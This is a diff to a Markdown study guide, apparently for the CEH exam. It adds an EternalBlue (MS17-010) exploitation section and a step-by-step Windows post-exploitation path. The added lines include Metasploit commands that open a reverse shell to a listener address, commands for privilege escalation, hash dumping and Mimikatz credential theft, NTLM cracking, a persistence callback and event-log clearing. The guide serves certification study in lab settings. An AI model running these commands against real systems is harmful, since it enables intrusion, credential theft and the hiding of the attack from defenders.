@@ -16,14 +16,15 @@ This domain covers breaking into systems and maintaining access. You'll crack cr
 **Key Topics:**
 - Remote Access Trojans (RAT) - Metasploit, msfvenom, payloads
 - RDP cracking with Hydra
-- File encryption/decryption and hash cracking
+- Windows exploitation (EternalBlue / MS17-010)
+- Windows post-exploitation core path (getsystem, hashdump, persistence)
+- Credential dumping (hashdump, Mimikatz) and hash cracking
 - SMB exploitation with weak credentials
-- Persistence mechanisms (registry, cron jobs)
 - Detection and analysis of RAT activity
 
 **Duration:** 15-20 minutes per task  
 **Difficulty:** Medium  
-**Tools:** Hydra, Metasploit, msfvenom, Hashcat, John
+**Tools:** Hydra, Metasploit, msfvenom, Mimikatz, Hashcat, John
 
 ---
 
@@ -177,6 +178,24 @@ msf> set LPORT 4444
 msf> run
 ```
 
+### EternalBlue (MS17-010) - Classic Windows Exploit
+
+The most common direct-exploit path in CEH labs. Hits unpatched Windows (7 / Server 2008/2012) over SMB (port 445) and drops you straight to a SYSTEM shell.
+
+```bash
+# 1. Confirm the target is vulnerable
+nmap -p445 --script smb-vuln-ms17-010 192.168.1.5
+
+# 2. Exploit
+msf> use exploit/windows/smb/ms17_010_eternalblue
+msf> set RHOSTS 192.168.1.5
+msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf> set LHOST 192.168.1.100
+msf> run
+```
+
+> **Exam tip:** EternalBlue lands you as **NT AUTHORITY\SYSTEM** already — no privesc needed. Go straight to `hashdump`.
+
 ### Meterpreter Commands
 
 ```
@@ -190,7 +209,88 @@ meterpreter > reg query HKLM\\Software  # Query registry
 
 ---
 
-## 2.6 Detecting RAT Activity
+## 2.6 Windows Post-Exploitation - Core Path
+
+### What It Does
+
+Once you have a Meterpreter session, this is the **standard CEH sequence**: confirm who you are → escalate to SYSTEM → dump password hashes → crack them → (optionally) persist and clean up. Follow it in order.
+
+### Step 1 — Check Privilege
+
+```
+meterpreter > getuid                    # Who am I?
+meterpreter > sysinfo                   # OS, arch, domain
+```
+
+If `getuid` already shows `NT AUTHORITY\SYSTEM` (e.g. after EternalBlue), skip to Step 3.
+
+### Step 2 — Escalate to SYSTEM
+
+```
+meterpreter > getsystem                 # Auto privesc to SYSTEM
+meterpreter > getuid                    # Verify: NT AUTHORITY\SYSTEM
+```
+
+If `getsystem` fails, try a UAC bypass or local exploit suggester:
+
+```
+meterpreter > background
+msf> use post/multi/recon/local_exploit_suggester
+msf> set SESSION 1
+msf> run                                # Lists privesc exploits that fit
+```
+
+### Step 3 — Dump Password Hashes
+
+```
+meterpreter > hashdump                  # Dump SAM (local NTLM hashes)
+```
+
+**Output format** (`user:RID:LMhash:NTLMhash:::`):
+```
+Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+The 4th field is the **NTLM hash** — that's what you crack.
+
+> **Need SYSTEM first.** `hashdump` requires SYSTEM. That's why Step 2 comes before it.
+
+### Step 4 — Grab Plaintext Credentials (Mimikatz / Kiwi)
+
+```
+meterpreter > load kiwi                 # Load Mimikatz module
+meterpreter > creds_all                 # All cached creds
+meterpreter > lsa_dump_sam              # SAM hashes
+meterpreter > lsa_dump_secrets          # LSA secrets
+```
+
+### Step 5 — Crack the NTLM Hash
+
+```bash
+# NTLM = hashcat mode 1000
+hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt
+
+# Or John
+john --format=NT ntlm_hashes.txt --wordlist=rockyou.txt
+```
+
+### Step 6 — Persistence (optional)
+
+```
+meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.1.100
+```
+- `-X` start at boot, `-i 30` retry every 30s, `-r` callback IP
+
+### Step 7 — Clear Tracks (optional)
+
+```
+meterpreter > clearev                   # Clear Windows event logs
+```
+
+> **CEH core path in one line:** `getuid → getsystem → hashdump → crack (hashcat -m 1000) → loot`.
+
+---
+
+## 2.7 Detecting RAT Activity
 
 ### In Network Traffic (Wireshark)
 
